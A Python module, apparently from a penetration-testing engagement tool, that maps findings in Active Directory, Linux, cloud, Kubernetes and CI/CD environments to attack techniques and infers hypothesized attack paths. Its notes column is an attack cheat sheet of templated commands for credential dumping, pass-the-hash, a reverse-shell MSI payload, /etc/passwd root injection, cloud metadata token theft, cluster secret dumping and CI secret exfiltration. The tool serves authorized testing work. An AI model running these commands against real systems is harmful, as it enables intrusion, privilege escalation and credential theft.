from __future__ import annotations
from typing import TYPE_CHECKING, Callable

if TYPE_CHECKING:
    from .session import Session

_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

# Technique triggers: (finding pattern, technique name, from_label, to_label, notes)
# --- Active Directory ---
_PATHS_AD = [
    ("smb signing disabled",        "NTLM Relay",                    "network position",            "target hosts",                "Responder + ntlmrelayx; coerce via PetitPotam/PrintSpooler/DFSCoerce"),
    ("esc1",                        "ESC1 — Certificate Abuse",      "low-privileged user",         "Domain Admin",                "certipy req -ca <CA> -template <tpl> -upn administrator@domain"),
    ("esc2",                        "ESC2 — Certificate Abuse",      "low-privileged user",         "Domain Admin",                "Enroll any-purpose cert, authenticate as any user"),
    ("esc3",                        "ESC3 — Certificate Agent",      "enrollment agent",            "Domain Admin",                "Enroll on behalf of DA using request agent cert"),
    ("esc4",                        "ESC4 — Template ACL",           "template writer",             "Domain Admin",                "Modify template to ESC1 conditions, then exploit"),
    ("esc6",                        "ESC6 — CA Flag",                "low-privileged user",         "Domain Admin",                "EDITF_ATTRIBUTESUBJECTALTNAME2 — SAN in any cert request"),
    ("esc8",                        "ESC8 — NTLM Relay to CA",       "network position",            "Domain Admin",                "Relay DC auth to HTTP enrollment endpoint"),
    ("kerberoastable",              "Kerberoasting",                 "any authenticated user",      "cracked service creds",       "GetUserSPNs.py -dc-ip <DC> domain/user; hashcat -m 13100"),
    ("asreproastable",              "ASREPRoasting",                 "unauthenticated",             "cracked account creds",       "GetNPUsers.py; hashcat -m 18200"),
    ("unconstrained delegation",    "Unconstrained Delegation",      "compromised delegation host", "Domain Admin",                "Coerce DC (PrintSpooler/PetitPotam/Coercer), capture TGT with Rubeus"),
    ("constrained delegation",      "S4U2Proxy Abuse",               "service account",             "target service",              "Rubeus s4u or impacket getST.py"),
    ("seimpersonateprivilege",      "Token Impersonation",           "service/IIS account",         "SYSTEM",                      "JuicyPotatoNG / PrintSpoofer / GodPotato"),
    ("sebackupprivilege",           "Registry Hive Extraction",      "account with SeBackup",       "local admin hash",            "reg save HKLM\\SAM + SYSTEM; impacket-secretsdump"),
    ("sedebugprivilege",            "LSASS Dump",                    "process with SeDebug",        "all local creds",             "procdump -ma lsass.exe or mimikatz sekurlsa::logonpasswords"),
    ("alwaysinstallelevated",       "MSI Privilege Escalation",      "low-privileged user",         "SYSTEM",                      "msfvenom -p windows/x64/shell_reverse_tcp -f msi; msiexec /i"),
    ("unquoted service path",       "Unquoted Service Path",         "low-privileged user",         "SYSTEM",                      "Plant binary in earlier path component, restart service"),
    ("writable.*service|service.*binary.*writable",
                                    "Service Binary Hijack",         "low-privileged user",         "SYSTEM",                      "Replace binary, sc stop/start or reboot"),
    ("writable.*scheduled task",    "Scheduled Task Hijack",         "low-privileged user",         "SYSTEM/task owner",           "Modify task action or script"),
    ("dll hijacking",               "DLL Hijacking",                 "low-privileged user",         "elevated process privileges", "Drop DLL in search path, trigger load"),
    ("autorun.*credentials|autologon", "AutoLogon Credential Extraction", "any user",              "admin account",               "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"),
    ("genericall|writedacl|writeowner", "ACL Abuse",                 "principal with ACE",          "target object",               "Add to group, reset password, or modify DACL — BloodHound → Abuse Info"),
    ("forcechangepassword",         "ForceChangePassword ACE",       "principal with ACE",          "target account",              "net rpc password or PowerView Set-DomainUserPassword"),
    ("laps password readable",      "LAPS Credential Read",          "low-privileged user",         "local admin on target",       "Get-LAPSPassword / pyLAPS — use to authenticate"),
    ("domain trust",                "Cross-Forest / Trust Attack",   "compromised domain",          "trusted domain",              "Enumerate trust type; SID history / ExtraSID injection"),
    ("admincount=1|adminsdholder",  "AdminSDHolder Persistence",     "domain admin",                "persistent admin rights",     "Set ACE on AdminSDHolder — propagates to all protected objects hourly"),
    ("credentials dumped|ntds",     "DCSync / NTDS Dump",            "domain admin or DCSync rights","all domain creds",           "secretsdump.py -just-dc domain/user@DC; crack or PtH offline"),
    ("rbcd|resource.based constrained", "RBCD Abuse",                "write RBAC on target",        "target host SYSTEM",          "Set msDS-AllowedToActOnBehalfOfOtherIdentity, S4U2Self+S4U2Proxy"),
    ("shadow credentials",          "Shadow Credentials",            "write to msDS-KeyCredentialLink","target account TGT",        "pyWhisker / Whisker; certipy auth -pfx <cert>"),
    ("gpo.*writable|modifiable.*gpo", "GPO Abuse",                  "GPO writer",                  "all computers in OU",         "Add scheduled task or computer startup script via GPO"),
    ("null.*session|anonymous.*allowed", "Null Session Enumeration", "unauthenticated",             "user/share/policy list",      "enum4linux -a <target>; rpcclient -U '' -N <target>"),
    ("password not required",       "Blank Password Attack",         "unauthenticated",             "account access",              "Attempt empty password auth — netexec smb <target> -u <user> -p ''"),
    ("admin access.*confirmed|pwn3d", "Lateral Movement",           "admin creds",                 "lateral hosts",               "netexec smb <range> -u <user> -H <hash> --local-auth"),
    ("ntlm hash",                   "Pass-the-Hash",                 "NTLM hash",                   "remote host",                 "netexec smb <target> -u <user> -H <hash>"),
]

# --- Linux Privilege Escalation ---
_PATHS_LINUX = [
    ("sudo nopasswd",               "Sudo NOPASSWD Abuse",           "current user",                "root",                        "sudo <binary> — check GTFOBins for escape technique"),
    ("suid.*root",                  "SUID Binary Abuse",             "current user",                "root",                        "Find via: find / -perm -4000 -user root 2>/dev/null; GTFOBins"),
    ("docker group",                "Docker Group Escape",           "docker group member",         "root",                        "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    ("lxd group",                   "LXD Container Escape",         "lxd group member",            "root",                        "Import Alpine image, mount host, chroot"),
    ("disk group",                  "Disk Group — Raw Read",         "disk group member",           "root (read shadow/keys)",     "debugfs /dev/sda1; read /etc/shadow or SSH keys"),
    ("nfs no_root_squash",          "NFS no_root_squash",           "local root on attacker",      "root on target",              "Mount NFS, create SUID binary as local root, execute on target"),
    ("/etc/shadow readable",        "Shadow Hash Extraction",        "current user",                "root via cracking",           "unshadow passwd shadow | hashcat -m 1800"),
    ("/etc/passwd writable",        "Passwd File Abuse",             "current user",                "root",                        "echo 'pwn::0:0::/root:/bin/bash' >> /etc/passwd"),
    ("cap_setuid|cap_sys_admin",    "Linux Capability Abuse",        "current user",                "root",                        "GTFOBins — capability-specific escape"),
    ("cron.*writable|cron job",     "Cron Job Hijack",               "current user",                "cron owner (often root)",     "Replace script or inject via writable PATH component"),
    ("ssh private key",             "SSH Key Lateral Movement",      "current user",                "key-authorized targets",      "ssh -i key user@target; enumerate authorized_keys"),
    ("hardcoded.*credentials",      "Config Credential Extraction",  "current user",                "service account",             "Grep configs: grep -r 'password' /var/www /etc /opt"),
    ("writable.*passwd|/etc/passwd writable", "/etc/passwd Write",  "current user",                "root",                        "Add root-equivalent user entry"),
]

# --- Cloud — AWS ---
_PATHS_AWS = [
    ("iam wildcard.*action.*resource|action.*\\*.*resource.*\\*",
                                    "AWS Full Account Takeover",    "wildcard IAM policy",          "full AWS account",            "Enumerate via: aws sts get-caller-identity; create admin user or role"),
    ("iam.*passrole.*createrole|passrole.*attachrolepolicy",
                                    "IAM Privilege Escalation",     "iam:PassRole + create/attach", "full AWS account",            "Create role with admin policy, assign to EC2/Lambda/yourself"),
    ("imdsv1.*enabled|ec2.*metadata|169\\.254\\.169\\.254",
                                    "IMDSv1 SSRF Credential Theft", "SSRF / server-side access",   "EC2 instance profile creds",  "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("s3.*public|public.*bucket",   "S3 Data Exfiltration",         "internet / internal access",  "bucket data",                 "aws s3 ls s3://<bucket> --no-sign-request; sync to exfil"),
    ("lambda.*admin|lambda.*iam",   "Lambda IAM Abuse",             "code execution in Lambda",    "full AWS account",            "Modify function or environment vars; extract creds from metadata"),
    ("cloudtrail.*disabled|logging.*false",
                                    "Blind Operations (no logging)", "any IAM principal",           "undetected actions",          "CloudTrail off — all API calls invisible to blue team"),
    ("assumerole.*without.*externalid|confused deputy",
                                    "Cross-Account Confused Deputy", "external attacker",           "target account",              "Assume role without ExternalId check from any AWS account"),
    ("secret.*environment|lambda.*secret",
                                    "Hardcoded Cloud Secret",       "code/config access",           "cloud service authentication", "Extract from Lambda env vars, ECS task def, or EC2 userdata"),
    ("security group.*0\\.0\\.0\\.0|open.*internet",
                                    "Exposed Cloud Service",        "internet",                     "direct service exploitation",  "Validate with nmap; check service version and auth"),
    ("aws.*access.*key|akia",       "AWS Static Credential Abuse",  "leaked access key",            "IAM permissions of key",      "aws iam get-user; enumerate permissions; check for admin"),
]

# --- Cloud — Azure ---
_PATHS_AZURE = [
    ("azure.*owner|contributor.*external|owner.*serviceprincipal",
                                    "Azure RBAC Privilege Escalation","Owner/Contributor role",      "subscription/resource control","Create new admin user, export secrets, modify infrastructure"),
    ("managed identity.*privileged|systemassigned.*contributor",
                                    "Azure Managed Identity Abuse", "compromised resource",         "subscription access",         "curl http://169.254.169.254/metadata/identity/oauth2/token"),
    ("storage.*public.*blob|allowblobpublicaccess.*true",
                                    "Azure Blob Public Access",     "internet",                     "storage account data",        "az storage blob list --container <name> --account-name <acct>"),
    ("key vault",                   "Azure Key Vault Secret Access", "identity with access policy",  "all vault secrets/certs",     "az keyvault secret list --vault-name <vault>; download all"),
    ("app service|function app",    "Azure App Service Credential Theft","code execution in app",   "managed identity / env creds","Access /env endpoint; read IDENTITY_ENDPOINT token"),
    ("azure.*client.*secret|arm_client",
                                    "Azure Service Principal Abuse", "leaked SP credentials",       "SP's RBAC permissions",       "az login --service-principal; enumerate role assignments"),
]

# --- Cloud — GCP ---
_PATHS_GCP = [
    ("gcp.*owner.*serviceaccount|roles/owner.*serviceaccount",
                                    "GCP SA Owner Role Abuse",      "SA key or token",              "full project access",         "gcloud auth activate-service-account; enumerate all resources"),
    ("allusers.*iam|allauthorizedusers.*iam",
                                    "GCP Public IAM Binding",       "internet / any GCP user",      "resource access",             "Directly access resource without authentication"),
    ("gcs.*public|bucket.*allusers", "GCP GCS Public Bucket",       "internet",                     "bucket data",                 "gsutil ls gs://<bucket>; gsutil cp -r gs://<bucket> ."),
    ("compute.*metadata|metadata\\.google\\.internal",
                                    "GCP Metadata Service SSRF",    "SSRF / code execution",        "service account token",       "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("workload identity",           "GCP Workload Identity Federation","k8s SA token",              "GCP SA permissions",          "Validate aud/sub claims; request GCP token via federated identity"),
]

# --- Containers / Kubernetes ---
_PATHS_CONTAINER = [
    ("privileged container|privileged.*true",
                                    "Privileged Container Escape",  "container process",           "host root",                   "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"),
    ("docker socket|/var/run/docker\\.sock",
                                    "Docker Socket Escape",         "container process",           "host root",                   "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    ("hostpath.*|.*root.*mounted|sensitive.*mount",
                                    "HostPath Volume Escape",       "container process",           "host filesystem access",      "Write to mounted host path — add SSH key, modify cron, etc."),
    ("cap_sys_admin|sys_admin",     "SYS_ADMIN Container Escape",   "container process",           "host root",                   "Mount host fs via cgroups v1 or misc techniques"),
    ("wildcard.*rbac|verbs.*\\*.*resources.*\\*",
                                    "K8s Wildcard RBAC",            "ServiceAccount / user",       "cluster-admin equivalent",    "kubectl exec, create pods, read secrets across namespaces"),
    ("rbac.*secrets.*read|secrets.*get.*verbs",
                                    "K8s Secret Read",              "SA/user with secrets access", "all cluster credentials",     "kubectl get secrets -A -o jsonpath='{.items[*].data}' | base64 -d"),
    ("pod.*exec|exec.*pods",        "K8s Pod Exec Privilege",       "SA/user with exec rights",    "arbitrary code in any pod",   "kubectl exec -it <pod> -- /bin/bash"),
    ("cluster.admin.*binding|clusterrole.*admin",
                                    "K8s Cluster-Admin Binding",    "bound SA or user",            "full cluster control",        "kubectl get all -A; read secrets; create privileged pods"),
    ("anonymous.*access|system:anonymous",
                                    "K8s Unauthenticated API Access","internet / network access",  "cluster enumeration",         "kubectl --server <url> --insecure-skip-tls-verify get pods"),
    ("serviceaccount.*admin|sa.*cluster.admin",
                                    "K8s SA to Cluster Admin",      "pod using admin SA",          "full cluster control",        "Extract SA token from /var/run/secrets/kubernetes.io/serviceaccount/token"),
    ("hostnetwork.*true",           "K8s Host Network Sniff",       "pod on host network",         "host traffic / internal reach","tcpdump on eth0 from within pod; reach internal services"),
    ("hostpid.*true",               "K8s Host PID Namespace",       "pod with hostPID",            "host process injection",      "nsenter or ptrace into host processes"),
    ("etcd.*exposed|etcd.*:2379",   "etcd Direct Access",           "network access to etcd",      "all cluster secrets + certs", "etcdctl get / --prefix --keys-only; extract all secrets"),
    ("trivy.*critical|cve.*critical", "Container CVE Exploitation", "network/container access",   "container compromise",        "Identify CVE, find PoC, exploit unpatched container"),
]

# --- CI/CD / DevOps ---
_PATHS_CICD = [
    ("pull_request_target.*checkout|cicd.*injection",
                                    "CI/CD Pipeline Injection",     "PR submitter / code contributor","secrets + repo write access","Submit malicious PR; secrets.GITHUB_TOKEN + write permissions"),
    ("self.hosted runner|jenkins.*build",
                                    "CI/CD Runner Compromise",      "CI/CD code execution",        "internal network access",     "Exfil env vars; pivot to internal services reachable by runner"),
    ("secret.*plaintext|ci.*secret.*exposed",
                                    "CI/CD Secret Exfiltration",    "CI/CD job execution",         "cloud / service credentials", "Print env; curl webhook; write to artifact"),
    ("oidc.*missing.*condition|oidc.*no.*trust",
                                    "OIDC Misconfiguration",        "any workflow in repo",        "cloud account access",        "Trigger workflow; exchange OIDC token for cloud credentials"),
    ("unpinned.*latest|supply.chain",
                                    "Supply Chain / Image Tamper",  "compromised upstream image",  "CI/CD runner compromise",     "Poison :latest tag; inject malicious layer"),
    ("jenkins.*unauthenticated|jenkins.*anonymous",
                                    "Jenkins Anonymous Access",     "network access",              "build secrets + code exec",   "Access /script endpoint (Groovy RCE) or trigger builds"),
    ("gitlab.*ci_job_token|job.*token",
                                    "GitLab CI Token Scope Abuse",  "CI job execution",            "other project API access",    "Use CI_JOB_TOKEN to clone/access other internal repos"),
    ("hardcoded.*ip.*cicd|internal.*ip.*pipeline",
                                    "Internal Network Pivot via CI","CI/CD runner",                "internal services",           "Use runner as pivot; curl internal endpoints from job"),
]

_FINDING_PATHS = _PATHS_AD + _PATHS_LINUX + _PATHS_AWS + _PATHS_AZURE + _PATHS_GCP + _PATHS_CONTAINER + _PATHS_CICD


def build_engagement_context(session: "Session", max_chars: int = 4000) -> str:
    summary = session.summary()
    lines = [
        f"ENGAGEMENT: {summary['name']}",
        f"Scope: {summary.get('scope') or 'not defined'}",
        f"Hosts: {len(summary['hosts'])}  "
        f"Services: {summary['services_count']}  "
        f"Credentials: {len(summary['credentials'])}  "
        f"Findings: {len(summary['findings'])}",
    ]

    hosts = summary.get("hosts", [])
    if hosts:
        lines.append("\nHOSTS:")
        for h in hosts[:15]:
            svcs = ", ".join(f"{s['port']}/{s['service']}" for s in h.get("services", [])[:8])
            hn = f" ({h['hostname']})" if h.get("hostname") else ""
            os_ = f" [{h['os']}]" if h.get("os") else ""
            lines.append(f"  {h['ip']}{hn}{os_}: {svcs or 'no services'}")

    creds = summary.get("credentials", [])
    if creds:
        lines.append("\nCREDENTIALS:")
        for c in creds[:15]:
            dom = f"{c['domain']}\\" if c.get("domain") else ""
            val = " [validated]" if c.get("validated") else ""
            preview = (c["secret"][:12] + "...") if c.get("secret") and len(c["secret"]) > 12 else c.get("secret", "")
            lines.append(f"  {dom}{c['username']} ({c['secret_type']}): {preview}{val}")

    findings = sorted(summary.get("findings", []), key=lambda f: _SEV_ORDER.get(f.get("severity", "medium"), 2))
    if findings:
        lines.append("\nFINDINGS:")
        for f in findings[:20]:
            host = f" @ {f['host_ip']}" if f.get("host_ip") else ""
            lines.append(f"  [{f['severity'].upper()}] {f['title']}{host}")

    paths = summary.get("paths", [])
    if paths:
        lines.append("\nATTACK PATHS:")
        for p in paths[:12]:
            chain = f"  {p.get('from_node','')} → {p.get('to_node','')}" if p.get("from_node") or p.get("to_node") else ""
            lines.append(f"  [{p['status'].upper()}] {p['technique']}{chain}")

    text = "\n".join(lines)
    return text[:max_chars]


def infer_paths(session: "Session", graph_search_fn: Callable) -> list[dict]:
    findings = session.get_findings()
    creds = session.get_credentials()
    new_paths = []

    for f in findings:
        title_lower = (f.get("title") or "").lower()
        desc_lower = (f.get("description") or "").lower()
        blob = title_lower + " " + desc_lower

        for pattern, technique, from_node, to_node, notes in _FINDING_PATHS:
            import re
            if re.search(pattern, blob, re.IGNORECASE):
                new_paths.append({
                    "technique": technique,
                    "from_node": from_node,
                    "to_node": to_node,
                    "status": "hypothesized",
                    "evidence": f.get("evidence", f.get("title", "")),
                    "notes": notes,
                })

        # Graph-based expansion for ADCS and delegation
        if f.get("type") in ("adcs", "kerberos", "delegation"):
            nodes = graph_search_fn(f.get("title", ""), limit=2)
            for node in nodes:
                for lead in node.get("leads_to", []):
                    new_paths.append({
                        "technique": node.get("name", f.get("title", "")),
                        "from_node": f.get("title", ""),
                        "to_node": lead,
                        "status": "hypothesized",
                        "evidence": f.get("evidence", ""),
                        "notes": f"Graph expansion from finding: {f.get('title','')}",
                    })

    for c in creds:
        stype = c.get("secret_type", "")
        dom = f"{c.get('domain', '')}\\{c['username']}" if c.get("domain") else c["username"]
        if stype == "ntlm":
            new_paths.append({
                "technique": "Pass-the-Hash",
                "from_node": f"{dom} (NTLM)",
                "to_node": "any SMB/WMI/WINRM target",
                "status": "hypothesized",
                "evidence": f"NTLM hash for {dom}",
                "notes": "netexec smb <targets> -u <user> -H <hash> --local-auth",
            })
        if stype in ("aes128", "aes256"):
            new_paths.append({
                "technique": "Overpass-the-Hash / Pass-the-Key",
                "from_node": f"{dom} (AES)",
                "to_node": "Kerberos-authenticated services",
                "status": "hypothesized",
                "evidence": f"AES key for {dom}",
                "notes": "impacket getST or Rubeus asktgt /enctype:aes256",
            })
        if stype == "ticket":
            new_paths.append({
                "technique": "Pass-the-Ticket",
                "from_node": dom,
                "to_node": "target service",
                "status": "hypothesized",
                "evidence": f"Ticket for {dom}",
                "notes": "Rubeus ptt /ticket:<base64> or export KRB5CCNAME",
            })

    # Persist new paths without overwriting confirmed/attempted ones
    existing = {(p["technique"], p.get("from_node", ""), p.get("to_node", "")): p["status"]
                for p in session.get_paths()}
    for p in new_paths:
        key = (p["technique"], p.get("from_node", ""), p.get("to_node", ""))
        if key not in existing or existing[key] == "hypothesized":
            session.upsert_path(**p)

    return new_paths
